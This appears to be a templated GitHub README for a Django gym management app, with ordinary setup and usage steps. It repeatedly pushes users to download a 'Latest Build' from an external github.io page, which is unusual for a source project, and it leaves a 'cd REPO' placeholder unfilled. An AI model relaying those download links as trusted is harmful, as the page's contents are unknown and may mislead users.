# Apna Gym System - Gym Management System 2026

> **Apna Gym System is a Django-powered web application that helps administrators handle members, trainers, plans, attendance, and payments from a centralized dashboard.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/fwood243/apna-gym-system-django?style=flat-square)](https://github.com/fwood243/apna-gym-system-django)

---

<p align="center">
  <a href="https://fwood243.github.io/apna-gym-system-django/">
    <img src="https://img.shields.io/badge/Download-Apna%20Gym%20System%20Latest-brightgreen?style=for-the-badge" alt="Download Apna Gym System">
  </a>
</p>

> **[Download Apna Gym System](https://fwood243.github.io/apna-gym-system-django/)**

---

[Download Latest Build](https://fwood243.github.io/apna-gym-system-django/)

---

## Overview

Apna Gym System is a browser-based gym administration tool developed with Python and Django. It combines essential operational data in one application, allowing staff to manage member profiles, trainer details, membership plans, attendance, and payment records.

Built around an authenticated administrator dashboard, the system supports the standard record-management cycle. Administrators can add new information, inspect existing entries, make changes, and remove records when necessary.

---

## What It Includes

- Store and manage member profiles and gym-related information
- Keep trainer records organized
- Define and maintain membership plans
- Log member attendance and review attendance history
- Maintain payment details
- Manage operations through an administrator dashboard
- Support create, read, update, and delete workflows
- Restrict application access through user authentication

---

## Setup

### 1. Clone the repository

Download the source and move into the project folder:

```bash
git clone https://github.com/fwood243/apna-gym-system-django.git
cd REPO
```

### 2. Set up a virtual environment

Create an isolated Python environment:

```bash
python -m venv .venv
```

For Linux and macOS, enable it with:

```bash
source .venv/bin/activate
```

Windows users can activate the environment through PowerShell:

```powershell
.venv\Scripts\activate
```

### 3. Install project packages

When a requirements file is provided, install the listed dependencies:

```bash
pip install -r requirements.txt
```

### 4. Initialize the database

Apply the Django migrations included with the project:

```bash
python manage.py migrate
```

To add an administrator account, run:

```bash
python manage.py createsuperuser
```

### 5. Run the development server

Launch the application with:

```bash
python manage.py runserver
```

Visit the local URL printed by Django in your web browser.

---

## Using the Application

A common administration sequence looks like this:

1. Log in through the protected application interface.
2. Create, view, or edit member information.
3. Add trainers and configure available membership plans.
4. Enter attendance for members.
5. Add payment information when payments are received.
6. Use the dashboard to review and maintain the stored records.

To run the project during development, use:

```bash
python manage.py runserver
```

Django will output the local address where the application can be opened.

---

## Database and Settings

The Django project settings control the application's configuration. SQLite can be used for a simple local setup, while MySQL is available when the application needs a separate database service.

For a MySQL configuration, provide the correct engine, database name, host, port, username, and password in the database settings. Whenever possible, avoid placing deployment credentials in files that are shared publicly.

---

## System Requirements

- A supported Python installation
- Django and the dependencies specified by the project
- A current web browser
- SQLite or MySQL for storing application data
- Enough disk space for the application and its records
- Network connectivity to the host when serving multiple users

---

## Frequently Asked Questions

### What type of user is this system intended for?

Apna Gym System is intended for gym administrators who want to manage members, trainers, plans, attendance, and payments through a web-based interface.

### How can I add an administrator account?

From the directory that contains the project, execute:

```bash
python manage.py createsuperuser
```

Django will guide you through the account creation prompts.

### Is MySQL supported alongside SQLite?

Yes. Both SQLite and MySQL are included as database options. Adjust the Django database configuration to match the service selected for your installation.

### Where should configuration changes be made?

Application settings are stored in the Django project configuration. Locate the settings module in the repository and update database or deployment-related values there.

### What should I do if the development server fails to launch?

Check that the virtual environment is enabled, all required packages are installed, migrations have been run, and the command is executed from the folder containing `manage.py`.

### How can I obtain updates?

Look for newer repository commits or published builds. When updating an existing installation, also review any project-specific migration and configuration instructions.

---

## Future Direction

Possible future improvements include strengthening the current administration workflows, polishing the dashboard, and extending the system's handling of gym records and reporting.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
